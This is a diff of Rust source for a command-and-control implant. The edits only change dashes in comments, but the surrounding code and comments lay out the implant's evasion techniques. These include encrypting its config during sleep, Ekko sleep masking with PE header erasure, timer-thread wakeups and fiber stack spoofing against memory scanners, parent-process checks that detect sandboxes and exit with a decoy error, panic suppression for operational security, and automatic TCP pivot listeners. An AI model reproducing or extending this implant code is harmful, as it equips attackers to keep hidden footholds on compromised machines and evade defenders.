@@ -51,7 +51,7 @@ async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2C
     let sleep_ms = duration.as_millis() as u32;
     
     let result = tokio::task::spawn_blocking(move || {
-        // 1. Generate keys and encrypt config — all on this thread's stack
+        // 1. Generate keys and encrypt config - all on this thread's stack
         let mut key = [0u8; 32];
         let mut nonce_bytes = [0u8; 12];
         OsRng.fill_bytes(&mut key);
@@ -64,7 +64,7 @@ async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2C
         let ciphertext = match cipher.encrypt(nonce, config_bytes.as_ref()) {
             Ok(ct) => ct,
             Err(_) => {
-                // Encryption failed — sleep with Ekko mask (PE header erasure +
+                // Encryption failed - sleep with Ekko mask (PE header erasure +
                 // timer dispatch + fiber stack spoof) and return config as-is.
                 evasion::ekko_sleep(sleep_ms);
                 return config_bytes;
@@ -75,7 +75,7 @@ async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2C
         // Without this, serde's serialized JSON (containing C2 hosts, keys,
         // etc.) sits in freed heap memory during the entire sleep phase,
         // completely visible to memory scanners. The config is safely stored
-        // in `ciphertext` now — we don't need the plaintext anymore.
+        // in `ciphertext` now - we don't need the plaintext anymore.
         let mut config_bytes = config_bytes; // rebind as mut for zeroize
         config_bytes.zeroize();
         
@@ -97,23 +97,23 @@ async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2C
         // ekko_sleep handles the sleep with three additional protections
         // beyond a plain Sleep():
         //
-        //   Gap 1 — PE header erasure: The MZ/PE header region is zeroed
-        //     for the duration of the sleep and restored on wakeup.  This
+        //   Gap 1 - PE header erasure: The MZ/PE header region is zeroed
+        //     for the duration of the sleep and restored on wakeup. This
         //     strips field-value signatures (magic, timestamp, EntryPoint
         //     RVA) that memory scanners match without touching executed code.
         //
-        //   Gap 3 — Timer-thread dispatch: The wake signal comes from a
+        //   Gap 3 - Timer-thread dispatch: The wake signal comes from a
         //     Windows timer-pool thread via CreateTimerQueueTimer; no agent
         //     code runs on the timer thread (SetEvent is used directly as
         //     the callback so the thread's entire stack is ntdll/kernel32).
         //
-        //   Gap 4 — Fiber stack spoof: The sleeping thread converts to a
+        //   Gap 4 - Fiber stack spoof: The sleeping thread converts to a
         //     fiber and parks inside a clean fiber blocked on the wake event.
-        //     Stack walkers see only ntdll!NtWaitForSingleObject —
+        //     Stack walkers see only ntdll!NtWaitForSingleObject -
         //     no unbacked agent frames during sleep.
         //
         // The C2Config JSON is already AES-256-GCM encrypted above (Gap 1
-        // for data).  Full .text content encryption is deferred to reflective-
+        // for data). Full .text content encryption is deferred to reflective-
         // load deployments (see docs/evasion.md).
         evasion::ekko_sleep(sleep_ms);
         
@@ -127,12 +127,12 @@ async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2C
 
         let result = match decrypted {
             Ok(plaintext) => plaintext,
-            // config_bytes was zeroized after encryption — can't use as fallback.
+            // config_bytes was zeroized after encryption - can't use as fallback.
             // Return empty vec; the outer code falls back to config_backup.
             Err(_) => Vec::new(),
         };
         
-        // Zero key material using zeroize crate — guarantees the compiler
+        // Zero key material using zeroize crate - guarantees the compiler
         // won't optimize out the zeroing. Handles underlying memory copies
         // that write_volatile would miss (inside cipher structs, stack padding, etc.)
         key.zeroize();
@@ -158,7 +158,7 @@ async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2C
     }
     drop(config);
 
-    // Zero the plaintext result bytes after deserialization — the decrypted
+    // Zero the plaintext result bytes after deserialization - the decrypted
     // config would otherwise persist on the freed heap indefinitely, rendering
     // the AES encryption during sleep useless against a memory dump.
     let mut result_buf = result;
@@ -171,7 +171,7 @@ async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2C
 }
 
 pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
-    // [OPSEC] Panic suppression — no stack traces to disk or stderr.
+    // [OPSEC] Panic suppression - no stack traces to disk or stderr.
     // Instead of completely swallowing panics (which makes logic bugs
     // impossible to diagnose), capture the last panic message in a static
     // buffer that can be queried by the C2 operator for diagnostics.
@@ -203,7 +203,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
         // Parent process validation (T1134.004 awareness).
         // If valid_parents is non-empty in the build config and the agent's
         // actual parent is not on the list, we're running in an unexpected
-        // spawn context — likely a sandbox or analyst double-click.
+        // spawn context - likely a sandbox or analyst double-click.
         // run_decoy() exits after printing a plausible error so the process
         // tree tells analysts nothing interesting.
         if evasion::is_bad_parent(&config.valid_parents) { evasion::run_decoy(); }
@@ -372,7 +372,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
                         continue;
                     }
 
-                    // Server verified — compute HMAC response
+                    // Server verified - compute HMAC response
                     let key_bytes = match BASE64.decode(&config.challenge_key) {
                         Ok(b) => b,
                         Err(_) => { continue; }
@@ -435,7 +435,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
             // The listener starts in a detached background task so it does not
             // block the main executor loop below. On failure (e.g. port already
             // in use), the error is logged in debug mode and the agent continues
-            // normally — the operator can still start the listener manually.
+            // normally - the operator can still start the listener manually.
             if let Some(port) = config.auto_pivot_port {
                 let cascade_mgr = pivot_mgr.clone();
                 let debug = config.debug;
@@ -599,7 +599,7 @@ async fn run_http_mode(
     // Semantics are identical to the TCP/TLS mode above: if auto_pivot_port
     // is set, start the TCP pivot listener immediately after registration
     // succeeds so the next hop can connect without operator intervention.
-    // HTTP-transport intermediate hops are unusual but supported — the pivot
+    // HTTP-transport intermediate hops are unusual but supported - the pivot
     // listener itself is always raw TCP regardless of the upstream transport.
     if let Some(port) = config.auto_pivot_port {
         let cascade_mgr = pivot_mgr.clone();
